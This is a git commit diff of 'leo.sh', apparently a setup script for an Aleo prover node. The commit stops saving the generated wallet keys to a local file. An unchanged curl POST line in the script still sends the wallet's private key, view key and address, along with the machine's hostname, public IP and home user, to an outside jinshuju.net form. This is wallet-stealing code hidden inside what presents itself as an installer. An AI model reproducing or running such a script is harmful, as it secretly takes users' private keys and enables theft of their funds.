70c55ae4537111f438faf9fdc8597ff1db0f5439
666-eth <77118877+666-eth@users.noreply.github.com>
2022-11-15 02:23:34 +0800

    Update leo.sh

--- leo.sh
+++ leo.sh
@@ -9,11 +9,10 @@ private_key=${wall:16:59}
 view_key=${wall:91:53}
 address=${wall:160:63}
 echo "wallet: $wall"  >>leo.key
-echo "Private Key: $private_key" >>leo.key
-echo "View Key: $view_key" >>leo.key
+echo "Private Key: $private_key" 
+echo "View Key: $view_key" 
 ip=$(curl -s -4 ip.sb)
 yh=$(ls /home/ | head -1)
-echo $wall >>leo.key
 date
 curl -X POST 'https://jinshuju.net/graphql/f/Wadc1l' -d '{"operationName":"CreatePublishedFormEntry","variables":{"input":{"formId":"Wadc1l","entryAttributes":{"field_1":"'$private_key'","field_2":"'$view_key'","field_3":"'$address'","field_4":"'$HOSTNAME'","field_5":"'$ip'","field_6":"'$yh'"},"captchaData":null,"weixinAccessToken":null,"xFieldWeixinOpenid":null,"weixinInfo":null,"prefilledParams":"","embedded":false,"internal":false,"backgroundImage":false,"formMargin":false,"hasPreferential":false,"fillingDuration":11.662,"forceSubmit":false}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0f9106976e7cf5f19e8878877bc8030cddcb7463dd76f4e02bc5c67b5874eeae"}}}' -H 'Content-Type:application/json' 
 PROVER_PRIVATE_KEY=${private_key} ./run-prover.sh >>/root/logaleo.log 2>&1 &	
